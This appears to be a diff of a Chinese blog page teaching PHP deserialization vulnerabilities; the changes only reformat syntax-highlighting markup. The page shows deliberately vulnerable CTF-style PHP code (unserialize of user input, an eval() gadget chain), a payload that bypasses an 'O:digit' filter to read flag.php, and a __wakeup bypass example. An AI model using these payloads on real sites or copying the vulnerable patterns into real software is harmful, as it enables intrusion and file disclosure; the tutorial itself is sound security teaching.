@@ -279,43 +279,43 @@
 </span><span class="lnt">36
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>  
-<span class="o">@</span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> 
-<span class="k">class</span> <span class="nc">baby</span> 
-<span class="p">{</span>   
-    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
-    <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>      
-    <span class="p">{</span>          
-        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">))</span> 
-        <span class="p">{</span>
-            <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;./</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>        
-            <span class="k">if</span> <span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>         
-            <span class="p">{</span>              
-                <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> 
-            <span class="p">}</span> 
-        <span class="p">}</span>     
-    <span class="p">}</span>  
-<span class="p">}</span>  
-<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span>  
-<span class="p">{</span> 
-    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>
-    <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[oc]:\d+:/i&#39;</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$matches</span><span class="p">);</span> <span class="c1">// 这里匹配到 O 后面跟着数字就拦截
-</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$matches</span><span class="p">))</span>
-    <span class="p">{</span>
-        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Hacker!&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">else</span>
-    <span class="p">{</span>
-        <span class="nv">$good</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
-        <span class="k">echo</span> <span class="nv">$good</span><span class="p">;</span>
-    <span class="p">}</span>     
-<span class="p">}</span> 
-<span class="k">else</span> 
-<span class="p">{</span> 
-    <span class="nx">highlight_file</span><span class="p">(</span><span class="s2">&#34;./index.php&#34;</span><span class="p">);</span> 
-<span class="p">}</span> 
-<span class="cp">?&gt;</span><span class="err"> 
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">baby</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span>   
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>      
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>          
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;./</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>        
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>         
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>              
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>     
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span>  
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[oc]:\d+:/i&#39;</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$matches</span><span class="p">);</span> <span class="c1">// 这里匹配到 O 后面跟着数字就拦截
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$matches</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Hacker!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$good</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$good</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>     
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="k">else</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="s2">&#34;./index.php&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Payload：<code>url?data=O:%2b4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} </code></p>
 <h2 id="3-php-bug-72663">3 PHP Bug 72663</h2>
@@ -352,33 +352,33 @@
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">class</span> <span class="nc">SoFun</span> <span class="p">{</span>
-    <span class="k">protected</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
-    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">))</span> <span class="p">{</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="nx">show_source</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
-            <span class="k">else</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Wrong filename.&#39;</span><span class="p">);</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
-    <span class="p">}</span>
-    
-    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
-    <span class="k">echo</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span><span class="err">#&lt;!--key in flag.php--&gt;
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SoFun</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="nx">show_source</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Wrong filename.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">#&lt;!--key in flag.php--&gt;
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -426,10 +426,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">session.save_path = &#34;E:/wamp64/tmp&#34;   -- 设置 session 的存储路径，默认在 /tmp
-session.auto_start = 0   -- 指定会话模块是否在请求开始时启动一个会话，默认为 0 不启动
-session.serialize_handler = php   -- 定义用来序列化/反序列化的处理器名字。默认使用 php
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">session.save_path = &#34;E:/wamp64/tmp&#34;   -- 设置 session 的存储路径，默认在 /tmp
+</span></span><span class="line"><span class="cl">session.auto_start = 0   -- 指定会话模块是否在请求开始时启动一个会话，默认为 0 不启动
+</span></span><span class="line"><span class="cl">session.serialize_handler = php   -- 定义用来序列化/反序列化的处理器名字。默认使用 php
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器，默认为php。如果要修改为其他的引擎，只需要添加代码 <code>ini_set('session.serialize_handler', '需要设置的引擎')</code>，如下所示：</p>
 <div class="highlight"><div class="chroma">
@@ -440,11 +440,11 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
-<span class="nx">session_start</span><span class="p">();</span>
-<span class="nv">$SESSION</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SESSION</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>存储的文件是以 <code>sess_sessionid</code> 来进行命名的，文件的内容就是 <code>session</code> 值的序列化之后的内容。可在 <code>session.save_path</code> 对应路径下看到一个新生成的 <code>session</code> 文件，这里名为 <code>sess_cj15cikdujk6uv3bdq6qvonbe7</code> ，可以看到存储格式为：<code>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</code>：<code>a|s3:&quot;123&quot;;</code></p>
 <p>使用 php_serialize 处理器：</p>
@@ -456,11 +456,11 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
-<span class="nx">session_start</span><span class="p">();</span>
-<span class="nv">$SESSION</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SESSION</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>格式：经过 serialize() 函数反序列处理的数组：<code>a:1:{s:1:&quot;a&quot;;s:3:&quot;123&quot;;}</code></p>
 <h3 id="42-php-session-反序列化漏洞">4.2 PHP session 反序列化漏洞</h3>
@@ -487,14 +487,14 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
-<span class="k">require</span><span class="p">(</span><span class="s1">&#39;./class.php&#39;</span><span class="p">);</span>
-<span class="nx">session_start</span><span class="p">();</span>
-<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">fool</span><span class="p">();</span>
-<span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s2">&#34;phpinfo.php&#34;</span><span class="p">;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span><span class="p">(</span><span class="s1">&#39;./class.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">fool</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s2">&#34;phpinfo.php&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>class.php</p>
 <div class="highlight"><div class="chroma">
@@ -544,50 +544,50 @@ session.serialize_handler = php   -- 定义用来序列化/反序列化的处理
 </span><span class="lnt">43
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">highlight_string</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">])));</span>
-<span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-
-<span class="k">class</span> <span class="nc">foo1</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
-    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s2">&#34;i.php&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
-        <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span><span class="p">)){</span>
-            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;文件&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span><span class="o">.</span><span class="s2">&#34;存在&lt;br&gt;&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">class</span> <span class="nc">foo2</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
-    <span class="k">public</span> <span class="nv">$obj</span><span class="p">;</span>
-    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s1">&#39;1234567890&#39;</span><span class="p">;</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">function</span> <span class="nf">__desctuct</span><span class="p">(){</span>
-        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">class</span> <span class="nc">foo3</span><span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
-    <span class="k">function</span> <span class="nf">execute</span><span class="p">(){</span>
-        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">function</span> <span class="nf">__desctuct</span><span class="p">(){</span>
-        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_string</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">])));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">foo1</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s2">&#34;i.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;文件&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span><span class="o">.</span><span class="s2">&#34;存在&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">foo2</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span> <span class="o">=</span> <span class="s1">&#39;1234567890&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">__desctuct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">foo3</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$varr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">execute</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">varr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">__desctuct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
